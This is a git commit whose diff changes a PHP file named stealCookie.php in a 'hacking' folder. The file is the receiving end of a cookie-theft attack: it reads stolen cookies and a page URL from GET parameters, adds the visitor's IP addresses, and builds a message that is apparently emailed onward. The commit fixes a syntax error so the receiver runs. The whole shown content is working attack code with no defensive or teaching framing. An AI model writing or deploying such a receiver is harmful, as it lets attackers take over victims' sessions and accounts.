aa01f79e8eb0a384f479d782940358edbac392e6
Luca-Castelnuovo <ltcastelnuovo@gmail.com>
2018-07-09 21:14:59 +0200

    test7ing mail function

--- php/hacking/stealCookie.php
+++ php/hacking/stealCookie.php
@@ -2,7 +2,7 @@
 
 $cookie = $_GET["cookie"];
 $link = $_GET["link"];
-$message = '<p><b>cookies:</b> ' . $cookie . '</p><p><b>URL:</b> ' . $link . '</p><p><b>HTTP_X_FORWARDED_FOR:</b> ' . {$_SERVER['HTTP_X_FORWARDED_FOR']} . ' & <b>REMOTE_ADDR:</b> ' . {$_SERVER['REMOTE_ADDR']} . '</p>';
+$message = '<p><b>cookies:</b> ' . $cookie . '</p><p><b>URL:</b> ' . $link . '</p><p><b>HTTP_X_FORWARDED_FOR:</b> ' . $_SERVER['HTTP_X_FORWARDED_FOR'] . ' & <b>REMOTE_ADDR:</b> ' . $_SERVER['REMOTE_ADDR'] . '</p>';
 
 if (!(empty($cookie) && empty($link))) {
     $headers = array(
